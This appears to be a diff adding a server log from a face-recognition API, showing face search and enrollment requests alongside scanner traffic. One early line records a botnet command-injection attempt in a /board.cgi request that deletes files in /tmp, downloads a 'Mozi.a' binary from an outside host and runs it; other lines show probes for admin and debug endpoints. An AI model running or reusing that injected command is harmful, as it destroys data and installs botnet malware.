+INFO:     205.210.31.148:65046 - "GET / HTTP/1.1" 404 Not Found
+INFO:     46.174.191.32:38364 - "GET / HTTP/1.0" 404 Not Found
+INFO:     182.56.215.165:37863 - "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://182.56.215.165:51859/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 Not Found
+INFO:     198.235.24.166:58068 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.241.200.213:60202 - "GET /manager/text/list HTTP/1.1" 404 Not Found
+2022-11-15 17:37:03.783 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 282.50872802734375, id: 437359909826986400)']"]
+2022-11-15 17:37:03.784 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[166.17252    82.6447    481.72748   378.81128     0.7487167]]
+('6284680ef6f4201104b3af75', 'static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75.jpg')
+path:  ['static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75.jpg']
+pr>>>>>>>>>>> ['437359909826986400']
+time:  0.17260384559631348
+INFO:     123.24.206.26:49614 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 17:41:22.620 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 244.45001220703125, id: 437359909826987275)']"]
+2022-11-15 17:41:22.620 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[210.79631    105.752716   470.6692     386.08096      0.83470845]]
+('62846810f6f4201104b3af81', 'static/74cb928c648411ed9b774ba7bb94539d_62846810f6f4201104b3af81.jpg')
+path:  ['static/74cb928c648411ed9b774ba7bb94539d_62846810f6f4201104b3af81.jpg']
+pr>>>>>>>>>>> ['437359909826987275']
+time:  0.19664573669433594
+INFO:     123.24.206.26:39752 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 17:41:57.716 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:40469 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 18:11:07.132 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 221.2466278076172, id: 437359909826986162)']"]
+2022-11-15 18:11:07.133 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[129.33118    289.92926    347.609      524.772        0.82906437]]
+('630053a08e6de33f58228691', 'static/b87612f45f0311ed8a8bb108c0801c44_630053a08e6de33f58228691.jpg')
+path:  ['static/b87612f45f0311ed8a8bb108c0801c44_630053a08e6de33f58228691.jpg']
+pr>>>>>>>>>>> ['437359909826986162']
+time:  0.20956134796142578
+INFO:     123.24.206.26:33177 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 18:11:58.281 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 445.31488037109375, id: 437359909826986568)']"]
+2022-11-15 18:11:58.281 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[147.26418    142.27136    495.5449     510.5179       0.76080084]]
+('62846811f6f4201104b3af89', 'static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89.jpg')
+path:  ['static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89.jpg']
+pr>>>>>>>>>>> ['437359909826986568']
+time:  0.20033955574035645
+INFO:     123.24.206.26:37106 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 18:12:13.227 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 385.03778076171875, id: 437359909826986575)']"]
+2022-11-15 18:12:13.228 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[128.87737   106.322784  515.0962    509.50903     0.6967733]]
+('62846811f6f4201104b3af89', 'static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89_masked.jpg')
+path:  ['static/7a9d193c622811edaede09a65ce7aeeb_62846811f6f4201104b3af89_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986575']
+time:  0.19030284881591797
+INFO:     123.24.206.26:57315 - "POST /recognize HTTP/1.1" 200 OK
+INFO:     45.142.192.5:53036 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.241.209.134:60262 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     45.142.192.8:38218 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+2022-11-15 19:24:52.943 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:51853 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 19:24:57.971 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:59450 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 19:25:01.296 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:48387 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 19:25:04.036 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:48192 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 19:25:08.845 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:58223 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 19:25:12.025 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 314.4049072265625, id: 437359909826986484)']"]
+2022-11-15 19:25:12.025 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[245.47586    154.10895    540.16766    357.78983      0.66485214]]
+('6284680ff6f4201104b3af79', 'static/e6aa46aa616411ed84aaad0224ec19ed_6284680ff6f4201104b3af79.jpg')
+path:  ['static/e6aa46aa616411ed84aaad0224ec19ed_6284680ff6f4201104b3af79.jpg']
+pr>>>>>>>>>>> ['437359909826986484']
+time:  0.1219329833984375
+INFO:     123.24.206.26:35990 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-15 19:25:29.133 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 338.6124267578125, id: 437359909826986554)']"]
+2022-11-15 19:25:29.134 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[181.5075   233.64496  406.33325  417.40326    0.757576]]
+('62fc73d3422ac27d7b64a805', 'static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg')
+path:  ['static/8896ff82622611edaede09a65ce7aeeb_62fc73d3422ac27d7b64a805.jpg']
+pr>>>>>>>>>>> ['437359909826986554']
+time:  0.1705169677734375
+INFO:     123.24.206.26:61519 - "POST /recognize HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.186:59666 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:34046 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     78.108.177.51:37974 - "GET / HTTP/1.0" 404 Not Found
+INFO:     202.58.199.144:42120 - "GET / HTTP/1.1" 404 Not Found
+INFO:     92.118.39.78:42646 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     185.180.143.136:38776 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.19:60556 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.5:48622 - "GET / HTTP/1.1" 404 Not Found
+INFO:     128.14.134.134:56034 - "GET / HTTP/1.1" 404 Not Found
+INFO:     87.236.176.226:40157 - "GET / HTTP/1.1" 404 Not Found
+INFO:     172.105.161.142:38964 - "GET / HTTP/1.1" 404 Not Found
+INFO:     152.89.196.211:43132 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 Not Found
+INFO:     192.241.207.8:38496 - "GET /hudson HTTP/1.1" 404 Not Found
+INFO:     152.89.196.211:44386 - "GET /actuator/gateway/routes HTTP/1.1" 404 Not Found
+INFO:     223.94.113.221:30749 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.7:41642 - "GET / HTTP/1.1" 404 Not Found
+INFO:     92.118.39.78:47666 - "GET / HTTP/1.1" 404 Not Found
+INFO:     46.174.191.30:38364 - "GET / HTTP/1.0" 404 Not Found
+INFO:     198.199.114.218:33168 - "GET /actuator/health HTTP/1.1" 404 Not Found
+INFO:     45.142.192.5:49978 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.169:62318 - "GET / HTTP/1.1" 404 Not Found
+INFO:     128.14.141.34:52204 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.142.192.6:48546 - "GET / HTTP/1.1" 404 Not Found
+INFO:     41.78.73.121:23710 - "GET / HTTP/1.1" 404 Not Found
+INFO:     161.35.183.194:52012 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.8:32896 - "GET / HTTP/1.1" 404 Not Found
+INFO:     45.142.192.7:36510 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:52440 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     92.118.39.78:59264 - "GET / HTTP/1.1" 404 Not Found
+INFO:     190.180.154.26:46813 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.241.209.26:45918 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.241.200.146:48262 - "GET / HTTP/1.1" 404 Not Found
+2022-11-16 07:44:04.190 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 293.5857849121094, id: 437359909826986442)']"]
+2022-11-16 07:44:04.191 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[200.36057    155.72917    480.54443    445.89496      0.82506955]]
+('62fc7533422ac27d7b650971', 'static/6fae596e615b11ed84aaad0224ec19ed_62fc7533422ac27d7b650971.jpg')
+path:  ['static/6fae596e615b11ed84aaad0224ec19ed_62fc7533422ac27d7b650971.jpg']
+pr>>>>>>>>>>> ['437359909826986442']
+time:  0.25676488876342773
+INFO:     123.24.206.26:43589 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 07:49:43.864 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 310.3057861328125, id: 437359909826986099)']"]
+2022-11-16 07:49:43.865 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[187.06702   118.739365  516.36304   392.91306     0.7508329]]
+('63049c4467148c4f842702e1', 'static/1dab7b225f0011ed8a8bb108c0801c44_63049c4467148c4f842702e1_masked.jpg')
+path:  ['static/1dab7b225f0011ed8a8bb108c0801c44_63049c4467148c4f842702e1_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986099']
+time:  0.32311487197875977
+INFO:     123.24.206.26:51315 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 07:51:47.167 | ERROR    | module.mysql_helpers:show_image:95 - Mysql error: tuple index out of range with sql: select image_path from _2090App where person_id = %s ;
+INFO:     123.24.206.26:56035 - "POST /showimage HTTP/1.1" 200 OK
+Invalid SOS parameters for sequential JPEG
+2022-11-16 07:53:18.354 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 07:53:21.383 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 07:53:21.384 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 07:53:21.389 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 07:53:23.750 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
+2022-11-16 07:53:26.779 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
+2022-11-16 07:53:26.780 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
+2022-11-16 07:53:26.789 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
+2022-11-16 07:53:26.789 | INFO     | __main__:insert:264 - Masked id [437359909826987534], Non mask id [437359909826987520]
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+save done:  static/0e0d93ea654911ed9b774ba7bb94539d_626a1c9f15e49f66d33d5c87.jpg
+[[0.9999719]]
+path image static/0e0d93ea654911ed9b774ba7bb94539d_626a1c9f15e49f66d33d5c87.jpg
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
+set det-size: (128, 128)
+Total:  10.969417810440063
+INFO:     123.24.206.26:40041 - "POST /insert HTTP/1.1" 200 OK
+2022-11-16 07:54:09.469 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 192.04624938964844, id: 437359909826987520)']"]
+2022-11-16 07:54:09.470 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[157.46663   175.46126   493.27942   477.43677     0.6992502]]
+('626a1c9f15e49f66d33d5c87', 'static/0e0d93ea654911ed9b774ba7bb94539d_626a1c9f15e49f66d33d5c87.jpg')
+path:  ['static/0e0d93ea654911ed9b774ba7bb94539d_626a1c9f15e49f66d33d5c87.jpg']
+pr>>>>>>>>>>> ['437359909826987520']
+time:  0.20676636695861816
+INFO:     123.24.206.26:39877 - "POST /recognize HTTP/1.1" 200 OK
+WARNING:  Unsupported upgrade request.
+2022-11-16 07:59:09.818 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 248.9842529296875, id: 437359909826986078)']"]
+2022-11-16 07:59:09.819 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[202.6913     176.52814    453.10794    427.21802      0.84291494]]
+('634e69d5bbddf814f940645f', 'static/b95a8e065eff11ed8a8bb108c0801c44_634e69d5bbddf814f940645f.jpg')
+path:  ['static/b95a8e065eff11ed8a8bb108c0801c44_634e69d5bbddf814f940645f.jpg']
+pr>>>>>>>>>>> ['437359909826986078']
+time:  0.248399019241333
+INFO:     123.24.206.26:55602 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 07:59:12.576 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:60967 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 07:59:16.812 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:37772 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 07:59:21.035 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:57091 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 07:59:31.216 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:53625 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 07:59:36.260 | ERROR    | __main__:search:324 - Not face
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box []
+INFO:     123.24.206.26:58323 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:00:04.285 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 382.00286865234375, id: 437359909826986407)']"]
+2022-11-16 08:00:04.285 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[175.5231   80.80138 502.02902 363.12433   0.62096]]
+('6284680ef6f4201104b3af75', 'static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75_masked.jpg')
+path:  ['static/40bf898c609a11ed84aaad0224ec19ed_6284680ef6f4201104b3af75_masked.jpg']
+pr>>>>>>>>>>> ['437359909826986407']
+time:  0.14998507499694824
+INFO:     123.24.206.26:60028 - "POST /recognize HTTP/1.1" 200 OK
+2022-11-16 08:02:31.359 | DEBUG    | module.milvus_helpers:search_vectors:163 - Successfully search in collection: ["['(distance: 341.5145263671875, id: 437359909826985994)']"]
+2022-11-16 08:02:31.360 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/det_500m.onnx detection [1, 3, '?', '?'] 127.5 128.0
+Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
+find model: /home/ai-r-d/.insightface/models/buffalo_sc/w600k_mbf.onnx recognition ['None', 3, 112, 112] 127.5 127.5
+set det-size: (640, 640)
+box [[204.28423    214.59416    536.7324     563.6885       0.74751383]]
